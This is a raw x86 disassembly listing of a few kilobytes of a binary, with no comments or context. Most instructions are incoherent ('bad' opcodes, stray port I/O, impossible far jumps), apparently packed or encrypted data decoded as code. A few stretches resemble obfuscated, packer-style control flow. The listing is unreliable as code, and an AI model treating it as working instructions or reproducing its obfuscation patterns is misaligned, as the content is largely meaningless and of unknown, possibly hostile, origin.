  403972:	les    esp,FWORD PTR [edx-0x3e9a6cf]
  403978:	push   edi
  403979:	dec    esi
  40397a:	fs retf 0xcc4c
  40397e:	jo     0x403945
  403980:	cwde   
  403981:	sub    BYTE PTR [ebx-0x517ddb9f],0x5c
  403988:	add    eax,0xc2685836
  40398d:	aam    0x61
  40398f:	xor    ecx,eax
  403991:	pop    eax
  403992:	mov    ebx,0xc5c56e73
  403997:	mov    ebp,0x891efba6
  40399c:	push   edi
  40399d:	inc    edi
  40399e:	add    DWORD PTR [esp+ecx*4],esp
  4039a1:	dec    ebp
  4039a2:	pop    esi
  4039a3:	mov    dl,0x89
  4039a5:	repnz or DWORD PTR [edi+0x1c],ebx
  4039a9:	adc    bl,bl
  4039ab:	not    BYTE PTR [edx+0x5816ba4]
  4039b1:	xlat   BYTE PTR ds:[ebx]
  4039b2:	mov    ah,dl
  4039b4:	ins    BYTE PTR es:[edi],dx
  4039b5:	dec    ecx
  4039b6:	push   ecx
  4039b7:	cmc    
  4039b8:	(bad)  
  4039ba:	int3   
  4039bb:	mov    DWORD PTR [ebx],ebx
  4039bd:	aam    0x74
  4039bf:	push   ebx
  4039c0:	cmp    al,0x6b
  4039c2:	xlat   BYTE PTR ds:[ebx]
  4039c3:	cmp    DWORD PTR gs:[ebx],eax
  4039c6:	mov    DWORD PTR [esi+0x565f245d],ecx
  4039cc:	out    dx,eax
  4039cd:	stc    
  4039ce:	jecxz  0x403a31
  4039d0:	stos   BYTE PTR es:[edi],al
  4039d1:	(bad)  
  4039d2:	fucomip st,st(0)
  4039d4:	int3   
  4039d5:	cld    
  4039d6:	or     BYTE PTR [ecx+0x21],cl
  4039d9:	mov    bl,0x4d
  4039db:	ds jnp 0x403a25
  4039de:	sahf   
  4039df:	mov    ds,WORD PTR [ebx]
  4039e1:	mov    dl,BYTE PTR ds:0x7ffb9d9b
  4039e7:	pop    edi
  4039e8:	or     DWORD PTR [ebx+0x1f71bef7],ebp
  4039ee:	ds sub bh,cl
  4039f1:	(bad)  
  4039f2:	sub    esi,DWORD PTR [ebx-0x3c]
  4039f5:	lods   eax,DWORD PTR ds:[esi]
  4039f6:	fisub  DWORD PTR [esi+0x14]
  4039f9:	es imul esi,esp,0x809bd701
  403a00:	or     dl,dh
  403a02:	fsubr  QWORD PTR [edx]
  403a04:	out    dx,eax
  403a05:	in     eax,dx
  403a06:	or     esi,eax
  403a08:	mov    eax,0x4fd59563
  403a0d:	mov    BYTE PTR [ebp+0x29],cl
  403a10:	mov    cl,0x5a
  403a12:	sbb    ebp,DWORD PTR [edi]
  403a14:	inc    edx
  403a15:	jl     0x403a17
  403a17:	dec    ecx
  403a18:	push   esp
  403a19:	test   eax,0x8c06ca
  403a1e:	xor    bl,BYTE PTR [edi-0x6aa96dac]
  403a24:	aas    
  403a25:	dec    esp
  403a26:	xor    al,0xbd
  403a28:	mov    gs,edi
  403a2a:	outs   dx,DWORD PTR ds:[esi]
  403a2b:	outs   dx,BYTE PTR ds:[esi]
  403a2c:	cmp    bl,0x6a
  403a2f:	or     ah,BYTE PTR [eax+0x50]
  403a32:	lds    ecx,FWORD PTR [eax]
  403a34:	push   0x25
  403a36:	sub    eax,0x8ee74eff
  403a3b:	mov    eax,ds:0xe5c0b8ad
  403a40:	in     eax,dx
  403a41:	int3   
  403a42:	out    dx,al
  403a43:	call   0x72ed55e3
  403a48:	aas    
  403a49:	adc    edi,edx
  403a4b:	pop    esi
  403a4c:	pop    esi
  403a4d:	sub    dl,BYTE PTR [ebx]
  403a4f:	jne    0x403ac0
  403a51:	jmp    0x720fc65b
  403a56:	jge    0x403ac0
  403a58:	sar    ah,0x3e
  403a5b:	xor    al,0xc3
  403a5d:	add    esp,edi
  403a5f:	ror    DWORD PTR [eax],0x12
  403a62:	cmp    al,0xf9
  403a64:	in     al,dx
  403a65:	xchg   esp,eax
  403a66:	sub    DWORD PTR [eax],0x49
  403a69:	popa   
  403a6a:	sub    eax,0xa231e364
  403a6f:	fiadd  WORD PTR [ecx]
  403a71:	cmp    dh,BYTE PTR [eax+ebx*2-0x518a31cb]
  403a78:	lea    eax,[ecx-0x66]
  403a7b:	sub    DWORD PTR [edx],edi
  403a7d:	rcl    bh,1
  403a7f:	sub    ebp,0x4c27d991
  403a85:	mov    WORD PTR [eax+ecx*8],cs
  403a88:	push   es
  403a89:	or     BYTE PTR [edx],bh
  403a8b:	jae    0x403b0c
  403a8d:	push   cs
  403a8e:	inc    ecx
  403a8f:	mov    ah,0xb2
  403a91:	retf   0x3b19
  403a94:	mov    eax,ds
  403a96:	or     BYTE PTR es:[ebx],bh
  403a99:	mov    bl,bl
  403a9b:	test   ah,dh
  403a9d:	inc    ebx
  403a9e:	fst    QWORD PTR [ebx+edx*2+0x6]
  403aa2:	mov    ebp,ecx
  403aa4:	inc    esp
  403aa5:	mov    eax,ds
  403aa7:	xlat   BYTE PTR ds:[ebx]
  403aa8:	mov    ds:0xd86c7313,al
  403aad:	sbb    ebp,esi
  403aaf:	push   esi
  403ab0:	mov    ch,cl
  403ab2:	rol    DWORD PTR [edi-0x74],cl
  403ab5:	ins    DWORD PTR es:[edi],dx
  403ab6:	aad    0xc6
  403ab8:	ficom  WORD PTR ds:0xc8b556ec
  403abe:	xchg   edi,eax
  403abf:	xor    DWORD PTR [edx],esp
  403ac1:	dec    ebp
  403ac2:	ds inc edi
  403ac4:	cmc    
  403ac5:	icebp  
  403ac6:	mov    edi,0xdafee385
  403acb:	mov    ah,0x98
  403acd:	retf   
  403ace:	pop    ecx
  403acf:	lods   eax,DWORD PTR ds:[esi]
  403ad0:	dec    esi
  403ad1:	ror    DWORD PTR [ecx+0x52],1
  403ad4:	je     0x403afd
  403ad6:	imul   eax
  403ad8:	mov    bh,0x8b
  403ada:	mul    BYTE PTR [edi+0x3e023d72]
  403ae0:	mov    ah,0x70
  403ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ae3:	adc    DWORD PTR [edi+0x43],0x564da9a7
  403aea:	push   es
  403aeb:	dec    ecx
  403aec:	lea    ecx,[edi]
  403aee:	into   
  403aef:	sub    DWORD PTR [edx-0x48f000bb],ecx
  403af5:	or     eax,0x42e7eb
  403afa:	adc    DWORD PTR ds:0x42fe76,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e224,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fdfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fdf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x3e975269],esi
  403b3e:	mov    ch,0xc5
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xdc70707d
  403b48:	jp     0x403b6d
  403b4a:	mov    eax,ds:0x30011524
  403b4f:	setle  BYTE PTR [edi]
  403b52:	test   eax,0xfb28c38
  403b57:	adc    BYTE PTR [esi+ebp*1+0x17],0x8
  403b5c:	lods   eax,DWORD PTR ds:[esi]
  403b5d:	(bad)  
  403b5e:	stc    
  403b5f:	push   ebx
  403b60:	lods   eax,DWORD PTR ds:[esi]
  403b61:	data16 fcomp DWORD PTR [ebp+0x78649d6a]
  403b68:	add    edx,ebx
  403b6a:	int3   
  403b6b:	pop    ebp
  403b6c:	mov    bl,0xec
  403b6e:	mov    eax,0x867c9786
  403b73:	or     bl,cl
  403b75:	shl    BYTE PTR ds:0xedd31b1d,cl
  403b7b:	out    dx,eax
  403b7c:	mov    dh,0xad
  403b7e:	leave  
  403b7f:	push   es
  403b80:	xor    al,0x64
  403b82:	jno    0x403b33
  403b84:	add    bh,BYTE PTR [esp+edi*2]
  403b87:	sbb    edx,ebp
  403b89:	rcr    BYTE PTR ds:0xe63db528,1
  403b8f:	xor    ecx,esi
  403b91:	in     al,dx
  403b92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b93:	xor    BYTE PTR [edx+0x16e766ce],ah
  403b99:	push   ebx
  403b9a:	ret    
  403b9b:	pop    edx
  403b9c:	inc    eax
  403b9d:	in     al,0x26
  403b9f:	mov    esp,0xf684fa89
  403ba4:	adc    BYTE PTR ss:[ebp+0x784bb35d],bh
  403bab:	(bad)  
  403bad:	cdq    
  403bae:	out    0xd3,al
  403bb0:	mov    al,cl
  403bb2:	pusha  
  403bb3:	dec    esp
  403bb4:	ss test al,0xb7
  403bb7:	lock inc esp
  403bb9:	jae    0x403b6c
  403bbb:	dec    esp
  403bbc:	(bad)  
  403bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bbe:	fisub  WORD PTR [eax]
  403bc0:	xor    dl,BYTE PTR [ebp-0x307f4c4a]
  403bc6:	(bad)  
  403bc7:	out    dx,eax
  403bc8:	lahf   
  403bc9:	je     0x403bb1
  403bcb:	mov    DWORD PTR [ecx+0x69bcba48],eax
  403bd1:	mov    WORD PTR [esi+eiz*1],fs
  403bd4:	xor    al,0x1f
  403bd6:	inc    DWORD PTR [ecx-0xd321b37]
  403bdc:	mov    ebx,0x489c0643
  403be1:	fs int3 
  403be3:	add    al,0xf
  403be5:	inc    edx
  403be6:	add    bh,BYTE PTR [esi-0x79]
  403be9:	jb     0x403baf
  403beb:	outs   dx,DWORD PTR ds:[esi]
  403bec:	fistp  DWORD PTR [edx+0x14]
  403bef:	xchg   edx,eax
  403bf0:	xchg   esp,eax
  403bf1:	jne    0x403b79
  403bf3:	jg     0x403c50
  403bf5:	out    dx,eax
  403bf6:	push   es
  403bf7:	test   BYTE PTR [edx-0x4a9281e],al
  403bfd:	ret    0xe4a0
  403c00:	lds    eax,FWORD PTR [ecx]
  403c02:	dec    edi
  403c03:	cli    
  403c04:	cmc    
  403c05:	pop    ebp
  403c06:	sti    
  403c07:	jg     0x403c2e
  403c09:	sub    eax,0x6f9b440c
  403c0e:	fcom   QWORD PTR [ebp+0x28]
  403c11:	add    al,BYTE PTR ds:0x1ba17d72
  403c17:	aad    0x3e
  403c19:	ins    BYTE PTR es:[edi],dx
  403c1a:	jmp    0xd5e1:0x49b1aa3d
  403c21:	jl     0x403bac
  403c23:	jl     0x403c6e
  403c25:	xchg   esp,eax
  403c26:	sbb    dl,0xdc
  403c29:	sbb    DWORD PTR [esi+0x75cd1250],ebx
  403c2f:	aad    0xcf
  403c31:	pop    ebx
  403c32:	retf   0xb4d9
  403c35:	leave  
  403c36:	sbb    BYTE PTR [esi+esi*8],dh
  403c39:	xlat   BYTE PTR ds:[bx]
  403c3b:	dec    ecx
  403c3c:	sbb    esp,DWORD PTR [edx+0xd]
  403c3f:	dec    ebp
  403c40:	mov    bh,0xe1
  403c42:	pop    ecx
  403c43:	pushf  
  403c44:	cmp    eax,0x92723901
  403c49:	jge    0x403c6c
  403c4b:	mov    dl,0x7f
  403c4d:	pop    ss
  403c4e:	jb     0x403be8
  403c50:	push   ecx
  403c51:	in     al,dx
  403c52:	rcl    BYTE PTR [edx+0x72a64d31],1
  403c58:	mov    ebx,0xd6cba303
  403c5d:	stos   BYTE PTR es:[edi],al
  403c5e:	fwait
  403c5f:	ins    DWORD PTR es:[edi],dx
  403c60:	or     BYTE PTR [ebx-0x40],bh
  403c63:	push   eax
  403c64:	out    0x87,al
  403c66:	mov    esp,0x1b8295d9
  403c6b:	test   BYTE PTR [edx-0x4e],ch
  403c6e:	repnz mov al,0x63
  403c71:	popf   
  403c72:	cmp    BYTE PTR [ebp+0x49],0xce
  403c76:	add    DWORD PTR [ebx+0x23],ebp
  403c79:	inc    esi
  403c7a:	mov    BYTE PTR [edi],bh
  403c7c:	gs mov ecx,0x927ebbdd
  403c82:	retf   
  403c83:	(bad)  
  403c84:	mov    cl,0xb1
  403c86:	inc    esi
  403c87:	adc    BYTE PTR [edx+0x127d55ed],bh
  403c8d:	and    BYTE PTR [ecx+0x2d],bh
  403c90:	je     0x403c74
  403c92:	mov    edx,0xffec4c15
  403c97:	in     eax,0x1b
  403c99:	push   0x62
  403c9b:	mov    al,0x39
  403c9d:	dec    ebx
  403c9e:	rcr    ch,0x1f
  403ca1:	adc    al,0x80
  403ca3:	into   
  403ca4:	gs dec esi
  403ca6:	lods   eax,DWORD PTR ds:[esi]
  403ca7:	test   BYTE PTR [ebx+0x59],ah
  403caa:	scas   eax,DWORD PTR es:[edi]
  403cab:	push   edx
  403cac:	imul   ebx,ebx,0xffffffd7
  403caf:	and    ebx,DWORD PTR [ebx-0x14]
  403cb2:	pop    edx
  403cb3:	jmp    0x403c84
  403cb5:	jo     0x403d33
  403cb7:	pop    esi
  403cb8:	inc    ebp
  403cb9:	test   BYTE PTR [eax],0xf1
  403cbc:	inc    edx
  403cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cbe:	xchg   ebx,eax
  403cbf:	push   es
  403cc0:	lea    ebx,[esp+ebp*1]
  403cc3:	ret    0x6bac
  403cc6:	out    dx,eax
  403cc7:	lods   eax,DWORD PTR ds:[esi]
  403cc8:	test   DWORD PTR [esi-0x4d54e3aa],eax
  403cce:	int    0x6e
  403cd0:	pop    edx
  403cd1:	lahf   
  403cd2:	cmp    eax,0xb4116f7e
  403cd7:	out    dx,al
  403cd8:	mov    cl,0x9a
  403cda:	aaa    
  403cdb:	sbb    esi,0xfffffff5
  403cde:	push   ds
  403cdf:	push   es
  403ce0:	pop    edx
  403ce1:	inc    ebx
  403ce2:	fs cmp eax,0x1d96822d
  403ce8:	pop    edi
  403ce9:	test   al,0xb7
  403ceb:	not    ebp
  403ced:	inc    edx
  403cee:	lods   eax,DWORD PTR ds:[esi]
  403cef:	outs   dx,DWORD PTR fs:[esi]
  403cf1:	imul   edx,eax,0x38
  403cf4:	sbb    DWORD PTR [esi+0x955af1e],ebp
  403cfa:	cmp    dl,bh
  403cfc:	sbb    ebp,DWORD PTR [ecx+0x27]
  403cff:	push   es
  403d00:	stos   DWORD PTR es:[edi],eax
  403d01:	rcr    BYTE PTR [eax-0x4e],1
  403d04:	adc    eax,0x5012c78b
  403d09:	data16 js 0x403caf
  403d0c:	cli    
  403d0d:	cmp    DWORD PTR [ebx-0x9857833],edx
  403d13:	stos   BYTE PTR es:[edi],al
  403d14:	mov    cl,0xe0
  403d16:	push   ecx
  403d17:	mov    al,ds:0x2b82f528
  403d1c:	jmp    0x4f52194a
  403d21:	jno    0x403d96
  403d23:	and    al,0xa9
  403d25:	imul   edx
  403d27:	loope  0x403cca
  403d29:	xor    ebp,DWORD PTR [ecx+0x42d14600]
  403d2f:	push   ebx
  403d30:	or     ah,cl
  403d32:	jecxz  0x403d03
  403d34:	pop    ebx
  403d35:	ror    DWORD PTR [eax],0xac
  403d38:	(bad)  
  403d39:	pop    esp
  403d3a:	scas   eax,DWORD PTR es:[edi]
  403d3b:	add    dl,BYTE PTR [esi]
  403d3d:	add    ah,0xf9
  403d40:	add    esi,DWORD PTR [edx+0x1d]
  403d43:	cmp    BYTE PTR [edi+0x65],ah
  403d46:	sub    DWORD PTR [ebx-0x34],eax
  403d49:	loopne 0x403d66
  403d4b:	inc    esp
  403d4c:	fsub   QWORD PTR [ebx]
  403d4e:	cwde   
  403d4f:	(bad)
  403d52:	sar    DWORD PTR [ecx-0x62],cl
  403d55:	out    dx,al
  403d56:	je     0x403d32
  403d58:	xor    al,0x9f
  403d5a:	ret    
  403d5b:	push   0xffffff8b
  403d5d:	test   BYTE PTR [ecx],0x89
  403d60:	dec    esi
  403d61:	retf   
  403d62:	sbb    ch,BYTE PTR [edi]
  403d64:	adc    al,0x9b
  403d66:	aam    0xe
  403d68:	jle    0x403cfb
  403d6a:	jbe    0x403de3
  403d6c:	xchg   esp,eax
  403d6d:	sub    dh,BYTE PTR [esi]
  403d6f:	hlt    
  403d70:	jp     0x403cfa
  403d72:	pop    ss
  403d73:	cdq    
  403d74:	xor    DWORD PTR [edi-0x55],0x5a578737
  403d7b:	ror    dl,cl
  403d7d:	adc    DWORD PTR ds:0xfd404ac8,ebx
  403d83:	inc    edx
  403d84:	jns    0x403dad
  403d86:	xchg   esp,eax
  403d87:	sub    bh,BYTE PTR [ebp+0x704ec840]
  403d8d:	adc    ch,BYTE PTR [edx-0x4e]
  403d90:	add    ah,BYTE PTR ds:0x9298c3aa
  403d96:	stc    
  403d97:	push   ebx
  403d98:	fldenv [ebx+0x3a98c464]
  403d9e:	dec    eax
  403d9f:	fisubr DWORD PTR ss:[ebp+0x3e]
  403da3:	push   ebp
  403da4:	xor    ah,BYTE PTR [ebx-0x37ec3645]
  403daa:	cmp    ch,0x5c
  403dad:	std    
  403dae:	inc    esi
  403daf:	xor    eax,DWORD PTR [edi-0x98a590c]
  403db5:	push   edi
  403db6:	pop    ebx
  403db7:	dec    esi
  403db8:	fadd   st(2),st
  403dba:	(bad)  
  403dbb:	pushf  
  403dbc:	jle    0x403dfa
  403dbe:	xor    bh,BYTE PTR [eax]
  403dc0:	mov    fs,WORD PTR [ebp+eax*8+0x7606fe18]
  403dc7:	dec    ch
  403dc9:	sub    eax,0xef4aeb94
  403dce:	pushf  
  403dcf:	lods   al,BYTE PTR ds:[esi]
  403dd0:	mov    ebp,ebx
  403dd2:	jns    0x403e42
  403dd4:	mov    eax,ds:0x5a451a13
  403dd9:	push   esi
  403dda:	repnz push ebp
  403ddc:	sbb    al,al
  403dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ddf:	int    0xd0
  403de1:	inc    ebx
  403de2:	dec    eax
  403de3:	inc    ebx
  403de4:	mov    BYTE PTR [ebx+0x7e39059b],dh
  403dea:	mov    bh,0xfc
  403dec:	xchg   ebx,eax
  403ded:	retf   
  403dee:	outs   dx,BYTE PTR ds:[esi]
  403def:	das    
  403df0:	in     al,dx
  403df1:	add    DWORD PTR [esi+eiz*2+0x5827c76a],ebx
  403df8:	idiv   BYTE PTR [eax-0x77f9a694]
  403dfe:	add    al,0x31
  403e00:	xchg   esp,eax
  403e01:	daa    
  403e02:	mov    edi,DWORD PTR [edx]
  403e04:	push   0xf624a8ad
  403e09:	mov    al,0x70
  403e0b:	and    dl,BYTE PTR ds:0xf08b8c88
  403e11:	into   
  403e12:	scas   al,BYTE PTR es:[edi]
  403e13:	neg    DWORD PTR [ebp-0x7104b0c]
  403e19:	xor    BYTE PTR [ebx],bl
  403e1b:	sub    al,0x1
  403e1d:	fldenv [ebp-0x53]
  403e20:	push   ebp
  403e21:	fdiv   QWORD PTR [edx+0x1ba9aba0]
  403e27:	sub    ecx,edi
  403e29:	mov    ds:0x7a70834a,al
  403e2e:	push   ds
  403e2f:	sub    bh,BYTE PTR [ebp+0x31]
  403e32:	or     DWORD PTR [esi-0x41],ebx
  403e35:	inc    ecx
  403e36:	in     al,0x90
  403e38:	jmp    0x6c26:0xbba9b7fa
  403e3f:	mov    ecx,0x6ffdfd90
  403e44:	inc    esi
  403e45:	mov    al,ds:0xc9bd3276
  403e4a:	shl    BYTE PTR [ebx],cl
  403e4c:	loope  0x403dd9
  403e4e:	jmp    0x403e71
  403e50:	lea    esi,[ebx]
  403e52:	and    ecx,DWORD PTR [ebp-0x2f]
  403e55:	shr    DWORD PTR [ebx+ebx*1+0x7e],0x5
  403e5a:	fmul   DWORD PTR [edx-0x6c]
  403e5d:	xchg   edx,eax
  403e5e:	lods   eax,DWORD PTR ds:[esi]
  403e5f:	xchg   esi,eax
  403e60:	cmp    eax,0x2052fea1
  403e65:	and    esp,DWORD PTR [eax+0x59]
  403e68:	in     al,0xb2
  403e6a:	ret    0x189e
  403e6d:	xchg   esi,eax
  403e6e:	inc    ebx
  403e6f:	in     eax,0x89
  403e71:	enter  0x121f,0xc2
  403e75:	xchg   BYTE PTR [edx],ch
  403e77:	sbb    al,BYTE PTR [edi+0x21857d8f]
  403e7d:	xchg   esp,eax
  403e7e:	mov    BYTE PTR [ecx+0x41],bl
  403e81:	adc    cl,BYTE PTR [eax]
  403e83:	sbb    BYTE PTR [ebx],dl
  403e85:	mov    al,0x72
  403e87:	out    dx,eax
  403e88:	test   al,0xe7
  403e8a:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403e91:	mov    eax,DWORD PTR [ebp-0x8]
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e21c
  403ea2:	adc    DWORD PTR ds:0x42e80f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fe72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fe05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e7ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x54581c35
  403eec:	lods   al,BYTE PTR ds:[esi]
  403eed:	xchg   esi,eax
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403f35
  403ef7:	gs dec esp
  403ef9:	xor    al,cl
  403efb:	push   ebx
  403efc:	jmp    0x4f09:0x29470dfc
  403f03:	and    DWORD PTR [ebx-0x37],eax
  403f06:	dec    esp
  403f07:	adc    dl,BYTE PTR [eax-0x13]
  403f0a:	stos   DWORD PTR es:[edi],eax
  403f0b:	in     al,dx
  403f0c:	xchg   BYTE PTR [esi-0x5e8b77bd],al
  403f12:	inc    edi
  403f13:	stc    
  403f14:	sub    eax,0x2682c5e9
  403f19:	dec    ecx
  403f1a:	fnstenv [ebx+0x1dcfd036]
  403f20:	loop   0x403f54
  403f22:	xchg   edi,eax
  403f23:	inc    edi
  403f24:	pop    esi
  403f25:	dec    ebx
  403f26:	mov    ebp,gs
  403f28:	xchg   BYTE PTR [edi],dl
  403f2a:	fadd   QWORD PTR [ebp+0x4d0a685f]
  403f30:	lea    edx,[eax]
  403f32:	adc    DWORD PTR [ecx],esp
  403f34:	loope  0x403f38
  403f36:	adc    al,0x6
  403f38:	or     bl,dl
  403f3a:	in     al,0x9c
  403f3c:	lds    edi,FWORD PTR [ecx-0x45]
  403f3f:	stos   BYTE PTR es:[edi],al
  403f40:	mov    bl,0xe8
  403f42:	test   al,0x4a
  403f44:	scas   eax,DWORD PTR es:[edi]
  403f45:	sub    ch,dh
  403f47:	sub    ebx,edx
  403f49:	dec    eax
  403f4a:	jg     0x403f58
  403f4c:	rcl    DWORD PTR [edx+ebx*8+0x20273b4d],0x5
  403f54:	dec    ecx
  403f55:	cmp    eax,0x17dfb738
  403f5a:	cmp    DWORD PTR [eax+0x4209cfaf],0x8bb5c679
  403f64:	loopne 0x403f9b
  403f66:	inc    ecx
  403f67:	loope  0x403f5e
  403f69:	mov    ecx,0xa1c16662
  403f6e:	and    ah,ah
  403f70:	ins    BYTE PTR es:[edi],dx
  403f71:	out    0xc5,eax
  403f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f74:	sub    BYTE PTR [ebp+esi*4+0x31db2056],dl
  403f7b:	test   eax,0xdb3810b3
  403f80:	(bad)  
  403f81:	fdiv   DWORD PTR [ebx+edi*4]
  403f84:	mov    dl,0x89
  403f86:	jecxz  0x403f7f
  403f88:	mov    fs,ecx
  403f8a:	pop    eax
  403f8b:	out    0x92,al
  403f8d:	(bad)  
  403f8e:	ins    BYTE PTR es:[edi],dx
  403f8f:	les    edi,FWORD PTR [ecx-0x19]
  403f92:	ja     0x403fa7
  403f94:	jmp    0x8ddc:0xae8c4c8c
  403f9b:	pop    ds
  403f9c:	lods   eax,DWORD PTR ds:[esi]
  403f9d:	je     0x403f5f
  403f9f:	and    eax,0x8542c0d9
  403fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa5:	cmp    BYTE PTR fs:[edx-0x5c],0xa8
  403faa:	out    0x67,al
  403fac:	adc    bl,cl
  403fae:	sub    al,0xc1
  403fb0:	adc    al,0x1a
  403fb2:	call   0xfdb:0xe0d19a6c
  403fb9:	daa    
  403fba:	int    0xe2
  403fbc:	ret    
  403fbd:	imul   edi,DWORD PTR [edx-0x5fa7a28b],0x4d9dfcad
  403fc7:	mov    bl,BYTE PTR [ebx+0x21]
  403fca:	(bad)  
  403fcb:	aas    
  403fcc:	test   DWORD PTR [esi-0xd],edi
  403fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fd0:	push   edx
  403fd1:	mov    esi,0xea034b7f
  403fd6:	bound  edi,QWORD PTR [ebx+0x5f]
  403fd9:	and    ebp,DWORD PTR [esi-0x1b]
  403fdc:	xchg   ebx,eax
  403fdd:	retfw  0xccff
  403fe1:	and    DWORD PTR [eax],0x726a474a
  403fe7:	pusha  
  403fe8:	adc    esp,eax
  403fea:	out    dx,al
  403feb:	sub    DWORD PTR [ebx+0x4d6887e0],0xd570e93a
  403ff5:	ja     0x403f81
  403ff7:	adc    bl,BYTE PTR [edi-0x46]
  403ffa:	lods   al,BYTE PTR ds:[esi]
  403ffb:	or     ebp,DWORD PTR [esi]
  403ffd:	sbb    dh,BYTE PTR ds:0x73ba2eeb
  404003:	sub    al,0x1e
  404005:	pop    esp
  404006:	gs ret 
  404008:	xlat   BYTE PTR ds:[ebx]
  404009:	push   esp
  40400a:	push   es
  40400b:	push   ebx
  40400c:	inc    ecx
  40400d:	pop    es
  40400e:	sahf   
  40400f:	cld    
  404010:	push   0x10
  404012:	push   esi
  404013:	repnz clts 
  404016:	cmp    BYTE PTR [edx+0x71ff0345],bl
  40401c:	mov    DWORD PTR [edx-0x30],edi
  40401f:	sahf   
  404020:	outs   dx,BYTE PTR gs:[esi]
  404022:	mov    cs,WORD PTR [esi-0x63]
  404025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404026:	mov    ecx,0x82715252
  40402b:	and    BYTE PTR [esi+0x3d],bl
  40402e:	addr16 inc esp
  404030:	sub    DWORD PTR [ebx+0x4a34a45d],0xc1f711a4
  40403a:	shl    edi,0xb4
  40403d:	mov    ah,0x74
  40403f:	call   0xaa02dbad
  404044:	jecxz  0x403fd3
  404046:	mov    eax,0x12c5e065
  40404b:	xchg   DWORD PTR [eax+0x2590ec0e],esi
  404051:	pop    ebx
  404052:	cmp    BYTE PTR [ebp+ebx*2-0x7972d3da],ah
  404059:	enter  0x69eb,0x48
  40405d:	add    DWORD PTR [ecx+0x47],ebp
  404060:	test   al,0x0
  404062:	adc    al,BYTE PTR cs:[esi+0x6656ccd]
  404069:	call   0xee627f19
  40406e:	sti    
  40406f:	cmp    BYTE PTR [ebp+0x49],ch
  404072:	je     0x404089
  404074:	sahf   
  404075:	mov    bl,0x7c
  404077:	popa   
  404078:	inc    esp
  404079:	test   eax,0xde64133d
  40407e:	daa    
  40407f:	sub    eax,0xd40e83ee
  404084:	rol    DWORD PTR [ecx],cl
  404086:	jmp    0x5259:0xa62950a0
  40408d:	xor    bl,BYTE PTR ss:[ecx+0x3e]
  404091:	jae    0x4040c3
  404093:	sub    al,0xda
  404095:	xchg   ecx,eax
  404096:	xor    DWORD PTR [ecx],ebx
  404098:	adc    esp,DWORD PTR [ebx-0x6a]
  40409b:	ret    0x75ef
  40409e:	xchg   ebp,eax
  40409f:	scas   eax,DWORD PTR es:[edi]
  4040a0:	push   es
  4040a1:	out    dx,al
  4040a2:	cwde   
  4040a3:	mov    al,0x8
  4040a5:	fisub  DWORD PTR [ebx-0x5b]
  4040a8:	cli    
  4040a9:	pop    ss
  4040aa:	xor    eax,ebp
  4040ac:	int    0xa5
  4040ae:	inc    ecx
  4040af:	sar    BYTE PTR [eax+eax*8],0x63
  4040b3:	xlat   BYTE PTR ds:[ebx]
  4040b4:	mov    dl,0x7a
  4040b6:	shr    DWORD PTR [ebx+ebp*8-0x2b],1
  4040ba:	js     0x404071
  4040bc:	mov    DWORD PTR [ecx+0x578b0fb4],esp
  4040c2:	(bad)  
  4040c3:	test   BYTE PTR [ebx],dh
  4040c5:	inc    eax
  4040c6:	pop    esi
  4040c7:	jb     0x40411b
  4040c9:	stc    
  4040ca:	jnp    0x404093
  4040cc:	lea    edi,[ecx-0x2efa4cee]
  4040d2:	mov    al,0xf3
  4040d4:	sub    eax,0xc8af07e4
  4040d9:	out    0x90,eax
  4040db:	in     al,0x97
  4040dd:	rcr    esi,cl
  4040df:	mov    eax,0xe7edf8c
  4040e4:	(bad)  [ebx-0x2271f93c]
  4040ea:	dec    esp
  4040eb:	loop   0x4040a3
  4040ed:	fmul   QWORD PTR [edx+0x4e]
  4040f0:	jo     0x40408d
  4040f2:	sub    DWORD PTR [esi+0x2e],esi
  4040f5:	mov    bh,0x6d
  4040f7:	push   edi
  4040f8:	dec    esi
  4040f9:	push   cs
  4040fa:	sub    eax,0x1eaa7ffb
  4040ff:	dec    esi
  404100:	rol    DWORD PTR [edx-0x4a],0x8a
  404104:	(bad)  
  404105:	loop   0x4040b6
  404107:	cli    
  404108:	neg    DWORD PTR [eax+edx*2+0x4201e5b7]
  40410f:	sbb    ebx,eax
  404111:	pop    ebx
  404112:	xor    DWORD PTR [esi+0x72f6ba97],esi
  404118:	push   ecx
  404119:	add    al,0x7a
  40411b:	pop    es
  40411c:	dec    esi
  40411d:	das    
  40411e:	mov    WORD PTR [esp+edi*2-0x1e],?
